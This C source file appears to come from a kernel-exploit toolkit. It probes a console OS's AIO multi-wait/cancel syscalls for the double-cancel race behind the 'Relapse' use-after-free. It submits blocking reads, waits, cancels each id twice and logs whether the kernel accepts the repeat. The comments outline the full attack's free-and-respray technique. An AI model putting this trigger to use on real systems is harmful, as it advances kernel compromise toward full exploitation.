/* t1_aio_wait_race.c — probe AIO multi-wait/cancel race (Relapse-вектор, syscall 663/666).
 * Что проверяет: состояние waiter-массива aio_multi_wait. Relapse 7.00-13.60 использует
 * UAF массива waiter'ов: пока aio_multi_wait держит ноды, их освобождают через отмену
 * запросов, а затем перезахватывают спреем. Здесь безопасная часть: submit блокирующихся
 * AIO-чтений -> multi_wait -> отмена, и проверка, не принимает ли ЕЩЁ раз отмену
 * уже отменённого id (признак незащищённого id-таблицы / двойного освобождения).
 * Детект: строка "DOUBLE-CANCEL-ACCEPTED" в /data/kexpl-t1-aio-wait.log.
 */
#include "kexpl.h"

#define N 8
static u8  reqs[N][0x40];
static u32 ids[N];
static u32 states[N];
static u8  sink[0x40];

static int submit_blocked_reads(int rfd, int *out_n){
    int ok = 0;
    for (int i = 0; i < N; i++) {
        u8 *r = reqs[i];
        for (int j = 0; j < 0x40; j++) r[j] = 0;
        *(u32 *)(r + 0x08) = 1;                  /* flags=1 (как в Relapse) */
        *(u64 *)(r + 0x10) = (u64)sink;           /* буфер-приёмник */
        *(u32 *)(r + 0x20) = (u32)rfd;            /* fd блокирующего чтения */
        u32 idout = 0;
        i64 rc = sys5(SYS_aio_submit_cmd, 1 /*AIO_CMD_READ*/, (i64)r, 1, 3, (i64)&idout);
        if (rc == 0 && idout && idout < 0x100000) { ids[ok] = idout; ok++; }
    }
    *out_n = ok;
    return ok;
}

int trig_main(void){
    zero_mem(ids, sizeof(ids));
    zero_mem(states, sizeof(states));
    zero_mem(sink, sizeof(sink));
    if (klog_init("t1-aio-wait", 1)) return 1;
    log_tag("t1"); log_s("AIO multi-wait/cancel race probe (syscalls 661/663/666)\n");

    int sv[2] = {0,0};
    i64 rc = sys4(SYS_socketpair, AF_UNIX, SOCK_STREAM, 0, (i64)sv);
    log_tag("t1"); log_s("socketpair rc="); log_l(rc); log_s(" fds="); log_l(sv[0]); log_s("/"); log_l(sv[1]); log_s("\n");
    if (rc != 0) { log_tag("t1"); log_s("RESULT: SKIP (no socketpair)\n"); log_flush(1); return 0; }

    int double_accept = 0, waits_ok = 0, cancels_ok = 0, iters = 3;
    for (int it = 0; it < iters; it++) {
        int n = 0;
        int got = submit_blocked_reads(sv[0], &n);
        log_tag("t1"); log_s("iter="); log_l(it); log_s(" submitted="); log_l(got); log_s("\n");
        if (got < 2) { log_tag("t1"); log_s("RESULT: SKIP (aio_submit_cmd refused; errno above)\n"); break; }

        long timeout[2]; timeout[0] = 10000; timeout[1] = 0;   /* как в Relapse: 16-байтный буфер */
        i64 w = sys5(SYS_aio_multi_wait, (i64)ids, n, (i64)states, 0, (i64)timeout);
        log_tag("t1"); log_s("aio_multi_wait rc="); log_l(w); log_s("\n");
        if (w == 0) waits_ok++;

        /* отменяем каждый id по одному и сразу пробуем отменить повторно */
        for (int i = 0; i < n; i++) {
            u32 one = ids[i];
            i64 c1 = sys3(SYS_aio_multi_cancel, (i64)&one, 1, (i64)states);
            if (c1 == 0) cancels_ok++;
            i64 c2 = sys3(SYS_aio_multi_cancel, (i64)&one, 1, (i64)states);
            if (c2 == 0) {
                double_accept++;
                log_tag("t1"); log_s("DOUBLE-CANCEL-ACCEPTED id="); log_h(one); log_s("\n");
            }
        }
        sleep_us(20000);
    }
    /* аккуратно закрываем блокирующий fd, чтобы ядро завершило worker'ы */
    sys1(SYS_close, sv[0]); sys1(SYS_close, sv[1]);
    log_tag("t1"); log_s("stats: waits_ok="); log_l(waits_ok);
    log_s(" cancels_ok="); log_l(cancels_ok); log_s(" double_accept="); log_l(double_accept); log_s("\n");
    if (double_accept) {
        log_tag("t1"); log_s("RESULT: POSITIVE — id-таблица принимает повторную отмену (кандидат на UAF/двойное освобождение)\n");
        log_flush(1); return 2;
    }
    log_tag("t1"); log_s("RESULT: NEGATIVE — повторная отмена отвергается (errno смотри выше); для полной проверки нужен UAF-спрей Relapse\n");
    log_flush(1);
    return 0;
}
